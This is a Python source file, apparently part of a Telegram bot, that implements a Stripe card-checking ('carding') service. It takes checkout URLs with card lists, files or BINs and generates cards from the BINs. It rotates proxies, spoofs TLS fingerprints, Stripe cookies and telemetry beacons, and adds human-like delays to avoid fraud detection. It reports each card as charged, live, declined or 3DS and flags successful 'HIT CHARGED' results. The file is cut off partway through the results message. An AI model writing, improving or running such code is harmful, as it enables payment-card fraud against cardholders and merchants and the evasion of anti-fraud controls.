import time
import re
import asyncio
import random
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

from config import OWNER_ID
from utils.constants import (
    SERVER_DISPLAY, CMD_NAME, CARD_SEPARATOR, STATUS_EMOJIS,
    get_currency_symbol, format_time,
)
from utils.access import check_access
from utils.card import parse_cards, generate_cards_from_bin, is_bin_input
from utils.checkout import (
    extract_checkout_url, get_checkout_info, charge_card, check_checkout_active,
)
from utils.proxy import (
    get_user_proxies, add_user_proxy, remove_user_proxy,
    get_global_proxies, add_global_proxy, remove_global_proxy,
    get_user_proxy, get_proxy_info, check_proxies_batch,
    get_proxy_url,
)
from utils.ratelimit import check_rate_limit, get_cooldown_seconds, MAX_CARDS_PER_COMMAND
from utils.stripe import generate_session_context, warm_checkout_session, send_m_stripe_beacon

router = Router()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  /addproxy — Add proxy for a user
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("addproxy"))
async def addproxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@sambat1234</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    user_proxies = get_user_proxies(user_id)

    if len(args) < 2:
        if user_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"

        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 🔒</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(user_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗔𝗱𝗱 : <code>/addproxy proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 : <code>/removeproxy proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 𝗔𝗹𝗹 : <code>/removeproxy all</code>\n"
            "「❃」 𝗖𝗵𝗲𝗰𝗸 : <code>/proxy check</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗙𝗼𝗿𝗺𝗮𝘁𝘀 :\n"
            "    • <code>host:port:user:pass</code>\n"
            "    • <code>user:pass@host:port</code>\n"
            "    • <code>host:port</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    proxy_input = args[1].strip()
    proxies_to_add = [p.strip() for p in proxy_input.split('\n') if p.strip()]

    # Auto-delete user message to hide proxy credentials
    try:
        await msg.delete()
    except Exception:
        pass

    if not proxies_to_add:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No valid proxies provided</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    checking_msg = await msg.answer(
        "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(proxies_to_add)}</code>\n"
        "「❃」 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : <code>10</code></blockquote>",
        parse_mode=ParseMode.HTML
    )

    results = await check_proxies_batch(proxies_to_add, max_threads=10)

    alive_proxies = []
    dead_proxies = []

    for r in results:
        if r["status"] == "alive":
            alive_proxies.append(r)
            add_user_proxy(user_id, r["proxy"])
        else:
            dead_proxies.append(r)

    response = f"<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ✅</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 : <code>{len(alive_proxies)}/{len(proxies_to_add)} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗮𝗱 : <code>{len(dead_proxies)}/{len(proxies_to_add)} ❌</code></blockquote>\n\n"

    if alive_proxies:
        response += "<blockquote>「❃」 𝗔𝗱𝗱𝗲𝗱 :\n"
        for p in alive_proxies[:5]:
            response += f"    • <code>{p['proxy']}</code> ({p['response_time']})\n"
        if len(alive_proxies) > 5:
            response += f"    • <code>... and {len(alive_proxies) - 5} more</code>\n"
        response += "</blockquote>"

    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  /removeproxy — Remove proxy for a user
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("removeproxy"))
async def removeproxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@sambat1234</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id

    if len(args) < 2:
        await msg.answer(
            "<blockquote><code>𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆 🗑️</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/removeproxy proxy</code>\n"
            "「❃」 𝗔𝗹𝗹 : <code>/removeproxy all</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    proxy_input = args[1].strip()

    if proxy_input.lower() == "all":
        user_proxies = get_user_proxies(user_id)
        count = len(user_proxies)
        remove_user_proxy(user_id, "all")
        await msg.answer(
            "<blockquote><code>𝗔𝗹𝗹 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 : <code>{count} proxies</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    if remove_user_proxy(user_id, proxy_input):
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_input}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
    else:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Proxy not found</code></blockquote>",
            parse_mode=ParseMode.HTML
        )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  /globalproxy — Manage global proxies (owner only)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("globalproxy"))
async def globalproxy_handler(msg: Message):
    if msg.from_user.id != OWNER_ID:
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Owner only</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    args = msg.text.split(maxsplit=2)
    global_proxies = get_global_proxies()

    # Auto-delete user message to hide proxy credentials
    if len(msg.text.split()) > 2:
        try:
            await msg.delete()
        except Exception:
            pass

    if len(args) < 2:
        if global_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in global_proxies[:15]])
            if len(global_proxies) > 15:
                proxy_list += f"\n    • <code>... and {len(global_proxies) - 15} more</code>"
        else:
            proxy_list = "    • <code>None</code>"

        await msg.answer(
            "<blockquote><code>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 🌍</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(global_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗔𝗱𝗱 : <code>/globalproxy add proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 : <code>/globalproxy remove proxy</code>\n"
            "「❃」 𝗖𝗹𝗲𝗮𝗿 : <code>/globalproxy remove all</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    action = args[1].lower()

    if action == "add" and len(args) > 2:
        proxy_text = args[2].strip()
        lines = msg.text.split('\n')
        proxies_to_add = []
        for line in lines:
            line = line.strip()
            if ':' in line and not line.startswith('/'):
                proxies_to_add.append(line)

        if not proxies_to_add and proxy_text:
            proxies_to_add = [proxy_text]

        if not proxies_to_add:
            await msg.answer(
                "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No valid proxies</code></blockquote>",
                parse_mode=ParseMode.HTML
            )
            return

        checking_msg = await msg.answer(
            "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(proxies_to_add)}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )

        results = await check_proxies_batch(proxies_to_add, max_threads=10)
        added = 0
        for r in results:
            if r["status"] == "alive":
                add_global_proxy(r["proxy"])
                added += 1

        total_now = len(get_global_proxies())
        await checking_msg.edit_text(
            "<blockquote><code>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 𝗔𝗱𝗱𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗔𝗱𝗱𝗲𝗱 : <code>{added}/{len(proxies_to_add)} ✅</code>\n"
            f"「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{total_now} proxies</code></blockquote>",
            parse_mode=ParseMode.HTML
        )

    elif action == "remove" and len(args) > 2:
        target = args[2].strip()
        if remove_global_proxy(target):
            total_now = len(get_global_proxies())
            await msg.answer(
                "<blockquote><code>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
                f"<blockquote>「❃」 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 : <code>{total_now} proxies</code></blockquote>",
                parse_mode=ParseMode.HTML
            )
        else:
            await msg.answer(
                "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No global proxies found</code></blockquote>",
                parse_mode=ParseMode.HTML
            )
    else:
        await msg.answer(
            "<blockquote><code>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 🌍</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗔𝗱𝗱 : <code>/globalproxy add proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 : <code>/globalproxy remove proxy</code>\n"
            "「❃」 𝗖𝗹𝗲𝗮𝗿 : <code>/globalproxy remove all</code></blockquote>",
            parse_mode=ParseMode.HTML
        )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  /proxy — View/check proxies
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("proxy"))
async def proxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@sambat1234</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id

    if len(args) < 2 or args[1].strip().lower() != "check":
        user_proxies = get_user_proxies(user_id)
        if user_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"

        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 🔒</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(user_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗖𝗵𝗲𝗰𝗸 𝗔𝗹𝗹 : <code>/proxy check</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    user_proxies = get_user_proxies(user_id)

    if not user_proxies:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No proxies to check</code>\n"
            "「❃」 𝗔𝗱𝗱 : <code>/addproxy proxy</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    checking_msg = await msg.answer(
        "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(user_proxies)}</code>\n"
        "「❃」 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : <code>10</code></blockquote>",
        parse_mode=ParseMode.HTML
    )

    results = await check_proxies_batch(user_proxies, max_threads=10)

    alive = [r for r in results if r["status"] == "alive"]
    dead = [r for r in results if r["status"] == "dead"]

    response = f"<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁𝘀 📊</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 : <code>{len(alive)}/{len(user_proxies)} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗮𝗱 : <code>{len(dead)}/{len(user_proxies)} ❌</code></blockquote>\n\n"

    if alive:
        response += "<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 :\n"
        for p in alive[:5]:
            ip_display = p['external_ip'] or 'N/A'
            response += f"    • <code>{p['proxy']}</code>\n      IP: {ip_display} | {p['response_time']}\n"
        if len(alive) > 5:
            response += f"    • <code>... and {len(alive) - 5} more</code>\n"
        response += "</blockquote>\n\n"

    if dead:
        response += "<blockquote>「❃」 𝗗𝗲𝗮𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 :\n"
        for p in dead[:3]:
            error = p.get('error', 'Unknown')
            response += f"    • <code>{p['proxy']}</code> ({error})\n"
        if len(dead) > 3:
            response += f"    • <code>... and {len(dead) - 3} more</code>\n"
        response += "</blockquote>"

    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  /co (dynamic CMD_NAME) — Main checkout command
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command(CMD_NAME))
async def co_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@sambat1234</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    start_time = time.perf_counter()
    user_id = msg.from_user.id
    text = msg.text or ""
    lines = text.strip().split('\n')
    first_line_args = lines[0].split(maxsplit=3)

    if len(first_line_args) < 2:
        await msg.answer(
            f"<blockquote><code>𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/{CMD_NAME} url cc|mm|yy|cvv</code>\n"
            f"「❃」 𝗕𝗜𝗡 : <code>/{CMD_NAME} url BIN</code>\n"
            f"「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /{CMD_NAME} url</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    url = extract_checkout_url(first_line_args[1])
    if not url:
        url = first_line_args[1].strip()

    cards = []
    bin_used = None

    if len(first_line_args) > 2:
        arg2 = first_line_args[2].strip()
        if is_bin_input(arg2):
            bin_used = re.sub(r'\D', '', arg2)
            cards = generate_cards_from_bin(bin_used, 10)
        else:
            cards = parse_cards(arg2)

    if len(lines) > 1 and not bin_used:
        remaining_text = '\n'.join(lines[1:])
        second_line = lines[1].strip()
        if is_bin_input(second_line) and not cards:
            bin_used = re.sub(r'\D', '', second_line)
            cards = generate_cards_from_bin(bin_used, 10)
        else:
            cards.extend(parse_cards(remaining_text))

    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
        if doc.file_name and doc.file_name.endswith('.txt'):
            try:
                file = await msg.bot.get_file(doc.file_id)
                file_content = await msg.bot.download_file(file.file_path)
                text_content = file_content.read().decode('utf-8')
                cards = parse_cards(text_content)
            except Exception as e:
                await msg.answer(
                    "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Failed to read file: {str(e)}</code></blockquote>",
                    parse_mode=ParseMode.HTML
                )
                return

    # Rate limiting check
    if cards and not check_rate_limit(user_id):
        cooldown = get_cooldown_seconds(user_id)
        await msg.answer(
            "<blockquote><code>⏳ 𝗥𝗮𝘁𝗲 𝗟𝗶𝗺𝗶𝘁𝗲𝗱</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Too many cards per minute</code>\n"
            f"「❃」 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 : <code>{cooldown}s</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    # Enforce max cards per command
    if len(cards) > MAX_CARDS_PER_COMMAND:
        cards = cards[:MAX_CARDS_PER_COMMAND]

    user_proxies = get_user_proxies(user_id)
    proxy_display = "DIRECT 🌐"

    if not user_proxies:
        proxy_display = "DIRECT 🌐"
    elif len(user_proxies) == 1:
        proxy_info = await get_proxy_info(user_proxies[0])
        if proxy_info["status"] == "dead":
            proxy_display = "DEAD ❌"
        else:
            proxy_display = f"LIVE ✅ | {proxy_info['ip_obfuscated']}"
    else:
        proxy_display = f"ROTATING 🔄 | {len(user_proxies)} proxies"


    processing_msg = await msg.answer(
        "<blockquote><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        "「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Parsing checkout...</code></blockquote>",
        parse_mode=ParseMode.HTML
    )

    # Auto-delete user's message to keep chat clean
    try:
        await msg.delete()
    except Exception:
        pass  # No delete permission in this chat

    # Create session context FIRST — same TLS/fingerprints for init AND confirm
    session_ctx = generate_session_context(user_id)
    init_proxy_raw = get_user_proxy(user_id)
    init_proxy = get_proxy_url(init_proxy_raw) if init_proxy_raw else None
    print(f"[DEBUG] Session: TLS={session_ctx['tls_profile']}, guid={session_ctx['fingerprints']['guid'][:8]}...")
    print(f"[DEBUG] Using SAME proxy for init + confirm: {'YES' if init_proxy else 'DIRECT'}")

    # ━━━ Step 1: Warm checkout session — get REAL Stripe cookies ━━━
    warm_result = await warm_checkout_session(
        checkout_url=url,
        tls_profile=session_ctx['tls_profile'],
        user_agent=session_ctx['user_agent'],
        proxy=init_proxy
    )
    if warm_result["cookies"]:
        # Update session context with REAL cookies from Stripe
        real_cookies = warm_result["cookies"]
        
        # ━━━ CRITICAL: Sync muid/sid with real cookies ━━━
        # Real browser: __stripe_mid cookie === muid in payment body
        if "__stripe_mid" in real_cookies:
            session_ctx["fingerprints"]["muid"] = real_cookies["__stripe_mid"]
        if "__stripe_sid" in real_cookies:
            session_ctx["fingerprints"]["sid"] = real_cookies["__stripe_sid"]
        
        real_cookies_str = "; ".join([f"{k}={v}" for k, v in real_cookies.items()])
        session_ctx["cookies"] = real_cookies_str
        session_ctx["real_cookies"] = real_cookies
        print(f"[DEBUG] ✅ REAL cookies synced: {list(real_cookies.keys())}")
        print(f"[DEBUG] ✅ muid={session_ctx['fingerprints']['muid'][:12]}... sid={session_ctx['fingerprints']['sid'][:12]}...")
    else:
        # No real cookies — build cookies FROM fingerprints so they match
        fp = session_ctx["fingerprints"]
        session_ctx["cookies"] = f"__stripe_mid={fp['muid']}; __stripe_sid={fp['sid']}"
        session_ctx["real_cookies"] = {}
        print(f"[DEBUG] ⚠️ No real cookies, built from fingerprints (synced)")

    # ━━━ Step 2: Send telemetry beacon to m.stripe.com ━━━
    beacon_ok, beacon_cookies = await send_m_stripe_beacon(
        fp=session_ctx['fingerprints'],
        checkout_url=url,
        tls_profile=session_ctx['tls_profile'],
        user_agent=session_ctx['user_agent'],
        cookies_str=session_ctx["cookies"],
        proxy=init_proxy
    )
    
    # If beacon returned cookies, merge them and sync fingerprints
    if beacon_cookies:
        if "__stripe_mid" in beacon_cookies:
            session_ctx["fingerprints"]["muid"] = beacon_cookies["__stripe_mid"]
        if "__stripe_sid" in beacon_cookies:
            session_ctx["fingerprints"]["sid"] = beacon_cookies["__stripe_sid"]
        # Rebuild cookies string with all cookies
        all_cookies = {}
        all_cookies[f"__stripe_mid"] = session_ctx["fingerprints"]["muid"]
        all_cookies[f"__stripe_sid"] = session_ctx["fingerprints"]["sid"]
        all_cookies.update(beacon_cookies)
        session_ctx["cookies"] = "; ".join([f"{k}={v}" for k, v in all_cookies.items()])
        print(f"[DEBUG] ✅ Beacon cookies merged + synced")

    # ━━━ Step 3: Init with real cookies ━━━
    # Pass TLS profile + proxy to init so it matches confirm
    checkout_data = await get_checkout_info(
        url,
        tls_profile=session_ctx['tls_profile'],
        user_agent=session_ctx['user_agent'],
        proxy=init_proxy,
        cookies_str=session_ctx["cookies"]
    )

    if checkout_data.get("error"):
        await processing_msg.edit_text(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>{checkout_data['error']}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    if not cards:
        await processing_msg.edit_text(
            f"<blockquote><code>𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No cards or BIN provided</code>\n"
            f"「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/{CMD_NAME} url cc|mm|yy|cvv</code>\n"
            f"「❃」 𝗕𝗜𝗡 : <code>/{CMD_NAME} url BIN</code>\n"
            f"「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /{CMD_NAME} url</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return

    currency = checkout_data.get('currency', '')
    sym = get_currency_symbol(currency)
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"

    bin_display = f"\n「❃」 𝗕𝗜𝗡 : <code>{bin_used}</code>" if bin_used else ""

    await processing_msg.edit_text(
        f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗦𝗲𝗿𝘃𝗲𝗿 : <code>{SERVER_DISPLAY}</code>\n"
        f"「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>{bin_display}\n"
        f"「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{len(cards)}</code>\n"
        f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Starting...</code></blockquote>",
        parse_mode=ParseMode.HTML
    )

    results = []
    charged_card = None
    cancelled = False
    check_interval = 5
    last_update = time.perf_counter()

    for i, card in enumerate(cards):
        # Random delay between cards (1.5–3.5s) to mimic human behavior
        if i > 0:
            await asyncio.sleep(random.uniform(1.5, 3.5))

        if len(cards) > 1 and i > 0 and i % check_interval == 0:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                cancelled = True
                break

        # Rotate proxy per card
        card_proxy = get_user_proxy(user_id)
        result = await charge_card(card, checkout_data, card_proxy, user_id=user_id, session_ctx=session_ctx, card_index=i)
        results.append(result)

        if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
            last_update = time.perf_counter()
            charged = sum(1 for r in results if r['status'] == 'CHARGED')
            live = sum(1 for r in results if r['status'] == 'LIVE')
            declined = sum(1 for r in results if r['status'] == 'DECLINED')
            three_ds = sum(1 for r in results if r['status'] == '3DS')
            captcha_solved = sum(1 for r in results if r['status'] == 'SOLVED CAPTCHA')
            errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])

            progress_lines = [
                f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n",
                f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n",
                f"「❃」 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n",
                f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} 😎</code>\n",
                f"「❃」 𝗟𝗶𝘃𝗲 : <code>{live} ✅</code>\n",
                f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} 🥲</code>\n",
                f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 😡</code>\n",
            ]
            if captcha_solved > 0:
                progress_lines.append(f"「❃」 𝗦𝗼𝗹𝘃𝗲𝗱 : <code>{captcha_solved} 🧩</code>\n")
            progress_lines.append(f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} 💀</code></blockquote>")

            try:
                await processing_msg.edit_text(
                    "".join(progress_lines),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass

        if result['status'] == 'CHARGED':
            charged_card = result
            break
        if result['status'] == 'SESSION_EXPIRED':
            break

    total_time = round(time.perf_counter() - start_time, 2)

    # Summary counts
    charged_count = sum(1 for r in results if r['status'] == 'CHARGED')
    live_count = sum(1 for r in results if r['status'] == 'LIVE')
    declined_count = sum(1 for r in results if r['status'] == 'DECLINED')
    three_ds_count = sum(1 for r in results if r['status'] == '3DS')
    captcha_count = sum(1 for r in results if r['status'] == 'SOLVED CAPTCHA')
    error_count = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED', 'UNKNOWN'])
    req_name = msg.from_user.full_name or msg.from_user.username or 'Unknown'
    req_user = f"@{msg.from_user.username}" if msg.from_user.username else req_name

    if charged_card:
        # ━━━ HIT FORMAT — Only show the charged card ━━━
        hit_card = charged_card['card']
        sep = "━━━━━━━━━━━━━━━━━━━━"
        response = (
            f"{sep}\n"
            f"  <b>𝗛𝗜𝗧 𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b> 😎\n"
            f"  𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 {price_str} ✅\n"
            f"{sep}\n\n"
            f"🌐 𝗣𝗿𝗼𝘅𝘆  ➜  {proxy_display}\n"
            f"🏪 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁  ➜  {checkout_data['merchant'] or 'N/A'}\n"
            f"📦 𝗣𝗿𝗼𝗱𝘂𝗰𝘁  ➜  {checkout_data['product'] or 'N/A'}\n\n"
            f"💳 𝗖𝗮𝗿𝗱  ➜  <code>{hit_card}</code>\n"
            f"📌 𝗦𝘁𝗮𝘁𝘂𝘀  ➜  CHARGED 😎\n"
            f"📝 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲  ➜  Payment Successful\n\n"
            f"{sep}\n"
        )
        summary_parts = [f"😎 {charged_count}"]
        if live_count > 0:
            summary_parts.append(f"✅ {live_count}")
        summary_parts.append(f"🥲 {declined_count}")
        if captcha_count > 0:
            summary_parts.append(f"🧩 {captcha_count}")
        if three_ds_count > 0:
            summary_parts.append(f"😡 {three_ds_count}")
        response += "  ".join(summary_parts)
        response += (
            f"\n🧮 {len(results)}/{len(cards)}  ⏱ {format_time(total_time)}\n"
            f"{sep}\n"
            f"👤 {req_user}\n"
